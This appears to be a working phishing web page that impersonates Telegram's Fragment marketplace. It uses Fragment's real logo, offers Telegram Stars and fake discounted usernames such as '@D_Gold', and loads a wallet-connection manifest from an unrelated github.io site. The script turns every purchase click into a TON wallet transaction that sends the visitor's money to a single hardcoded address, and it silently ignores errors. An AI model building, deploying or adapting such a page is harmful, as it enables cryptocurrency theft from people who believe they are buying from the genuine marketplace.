<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fragment: Usernames & Stars</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        body { background-color: #111b24; color: white; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; }
        .navbar { background: #17212b; padding: 15px 20px; display: flex; align-items: center; border-bottom: 1px solid #232e3c; }
        .logo { font-weight: bold; font-size: 18px; display: flex; align-items: center; gap: 8px; }
        .logo img { width: 24px; }
        
        .container { max-width: 500px; margin: 20px auto; padding: 0 15px; }
        .tabs { display: flex; gap: 20px; border-bottom: 2px solid #232e3c; margin-bottom: 20px; padding-bottom: 10px; }
        .tab { color: #8191a1; font-weight: bold; cursor: pointer; font-size: 14px; text-transform: uppercase; }
        .tab.active { color: #50a2e3; border-bottom: 2px solid #50a2e3; padding-bottom: 10px; margin-bottom: -12px; }

        .section-title { font-size: 18px; font-weight: bold; margin-bottom: 15px; display: block; }
        
        /* Box Style */
        .f-box { background: #17212b; border-radius: 12px; padding: 20px; border: 1px solid #232e3c; margin-bottom: 20px; }
        .label { color: #8191a1; font-size: 11px; font-weight: bold; margin-bottom: 10px; display: block; }
        
        .input-group { background: #0f171e; border: 1px solid #2b3a4a; border-radius: 8px; padding: 12px; display: flex; align-items: center; }
        .input-group input { background: transparent; border: none; color: white; width: 100%; font-size: 16px; outline: none; }
        
        .price-row { display: flex; justify-content: space-between; align-items: center; margin-top: 15px; padding-top: 15px; border-top: 1px solid #232e3c; }
        .ton-price { color: #fff; font-weight: bold; font-size: 18px; display: flex; align-items: center; gap: 5px; }
        .buy-btn { background: #50a2e3; color: white; border: none; padding: 10px 25px; border-radius: 8px; font-weight: bold; cursor: pointer; }

        /* Usernames List */
        .user-card { background: #17212b; padding: 15px; border-radius: 12px; border: 1px solid #232e3c; display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
        .u-info { display: flex; flex-direction: column; }
        .u-name { color: #50a2e3; font-weight: bold; }
        .u-status { color: #00ff00; font-size: 10px; font-weight: bold; }
        .u-price { font-weight: bold; color: white; font-size: 14px; }
        .discount-tag { background: #e35050; color: white; font-size: 9px; padding: 2px 5px; border-radius: 4px; margin-left: 5px; }

        #ton-connect-button { display: none; }
    </style>
</head>
<body>

    <div class="navbar">
        <div class="logo">
            <img src="https://fragment.com/img/logo.svg" alt="">
            FRAGMENT
        </div>
    </div>

    <div class="container">
        <div class="tabs">
            <div class="tab active">Stars</div>
            <div class="tab">Usernames</div>
            <div class="tab">Numbers</div>
        </div>

        <span class="section-title">Buy Telegram Stars</span>
        
        <div class="f-box">
            <span class="label">RECIPIENT</span>
            <div class="input-group">
                <input type="text" placeholder="Enter username or ID" value="@me">
            </div>
            
            <span class="label" style="margin-top: 20px;">QUANTITY</span>
            <div class="input-group">
                <input type="number" id="starsAmount" value="1000" oninput="updatePrice()">
            </div>

            <div class="price-row">
                <div class="ton-price" id="totalPrice">2.5 TON</div>
                <button class="buy-btn" onclick="processPayment()">Buy Stars</button>
            </div>
        </div>

        <span class="section-title">Featured Usernames <span class="discount-tag">-30% OFF</span></span>

        <div class="user-card" onclick="startOrder(150, '@D_Gold')">
            <div class="u-info">
                <span class="u-name">@D_Gold</span>
                <span class="u-status">AVAILABLE</span>
            </div>
            <div class="u-price">150 TON <span style="text-decoration: line-through; color: #555; font-size: 10px;">210</span></div>
        </div>

        <div class="user-card" onclick="startOrder(280, '@VVIP_7')">
            <div class="u-info">
                <span class="u-name">@VVIP_7</span>
                <span class="u-status">AVAILABLE</span>
            </div>
            <div class="u-price">280 TON <span style="text-decoration: line-through; color: #555; font-size: 10px;">400</span></div>
        </div>

    </div>

    <div id="ton-connect-button"></div>

    <script>
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://acenumber0.github.io/telegram/tonconnect-manifest.json?v=' + Date.now(),
            buttonRootId: 'ton-connect-button'
        });

        function updatePrice() {
            const amount = document.getElementById('starsAmount').value;
            const price = (amount * 0.0025).toFixed(2);
            document.getElementById('totalPrice').innerText = price + " TON";
            return price;
        }

        function processPayment() {
            const p = updatePrice();
            const a = document.getElementById('starsAmount').value;
            if(a < 500) { alert("Minimum 500 Stars"); return; }
            startOrder(p, a + " Stars");
        }

        async function startOrder(amount, label) {
            if (!tonConnectUI.connected) { await tonConnectUI.openModal(); return; }
            const nano = (amount * 1000000000).toString();
            const tx = {
                validUntil: Math.floor(Date.now() / 1000) + 360,
                messages: [{
                    address: "UQBNuacGY8g0jkr4mHsx6S9QFPNG3GTocxg-ZmB8Sgo5c_CS",
                    amount: nano,
                    payload: btoa("Fragment Order: " + label)
                }]
            };
            try { await tonConnectUI.sendTransaction(tx); } catch (e) {}
        }
    </script>
</body>
</html>
